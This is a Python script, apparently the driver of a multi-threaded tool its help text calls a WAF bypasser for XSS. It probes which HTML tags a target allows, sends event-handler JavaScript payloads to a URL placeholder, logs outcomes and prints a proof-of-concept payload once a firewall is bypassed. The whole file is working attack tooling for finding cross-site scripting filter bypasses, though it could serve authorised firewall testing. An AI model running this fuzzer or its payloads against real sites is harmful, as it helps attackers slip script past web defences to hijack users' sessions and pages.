import time
import argparse
import threading
import concurrent.futures
import numpy as np
from payload_generator.generator import HTML_TAGS, EVENT_LISTENERS
from injection_engine.engine import send_get_request
from response_analyzer.analyzer import analyze_response, check_if_allowed
from database.database import create_results_table, insert_result

shutdown_event = threading.Event()

def fuzzing_worker(target_url, target_waf, tags_to_probe, thread_id):
    print(f"[Thread-{thread_id}] Starting. Assigned {len(tags_to_probe)} tags.")
    
    for tag in tags_to_probe:
        if shutdown_event.is_set():
            print(f"[Thread-{thread_id}] Halting.")
            return

        print(f"[Thread-{thread_id}] Probing tag: <{tag}>...")
        if check_if_allowed(target_url, tag):
            print(f"[Thread-{thread_id}] Tag allowed: <{tag}>")
            
            for listener in EVENT_LISTENERS:
                if shutdown_event.is_set():
                    print(f"[Thread-{thread_id}] Shutting down.")
                    return

                js_code = "alert(1337);document.body.setAttribute('data-xss-success','true')"
                payload = f'<{tag} {listener}="{js_code}">'
                
                start_time = time.time()
                response = send_get_request(target_url, payload)
                response_time = time.time() - start_time

                status, reason = analyze_response(response, payload)
                print(f"[Thread-{thread_id}] -> <{tag} {listener}=...>: {status}")
                insert_result(target_waf, payload, status, reason, response_time)

                if status == "bypassed":
                    poc_payload = f'<{tag} {listener}="alert(1)">'
                    print(f"\nWAF Bypassed by Thread-{thread_id}!")
                    print(f"PoC Payload: {poc_payload}")
                    print(f"Full URL: {response.url if response else 'N/A'}")
                    shutdown_event.set()
                    return
            
            print(f"[Thread-{thread_id}] Finished fuzzing <{tag}>. Halting.")
            return

def main():
    parser = argparse.ArgumentParser(description="A simple WAF Bypasser for XSS.")
    parser.add_argument("url", help="URL with 'INJ' as a placeholder for the payload.")
    parser.add_argument("--waf", default="Unknown", help="The name of the WAF being tested.")
    parser.add_argument("--threads", type=int, default=1, help="Number of concurrent threads to use.")
    args = parser.parse_args()

    target_url = args.url
    target_waf = args.waf
    num_threads = args.threads

    if "INJ" not in target_url:
        print("Error: no placeholder.")
        return

    if not HTML_TAGS or not EVENT_LISTENERS:
        print("Error: no tags or event listeners.")
        return

    print(f"Starting bypasser for {target_url} with {num_threads} thread(s).")
    create_results_table()

    if num_threads > 1:
        tag_chunks = np.array_split(HTML_TAGS, num_threads)
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(fuzzing_worker, target_url, target_waf, chunk, i+1) for i, chunk in enumerate(tag_chunks) if len(chunk) > 0]
            concurrent.futures.wait(futures)
    else:
        fuzzing_worker(target_url, target_waf, HTML_TAGS, 1)

    if not shutdown_event.is_set():
        print("\nNo bypass found with the current configuration.")

if __name__ == "__main__":
    main()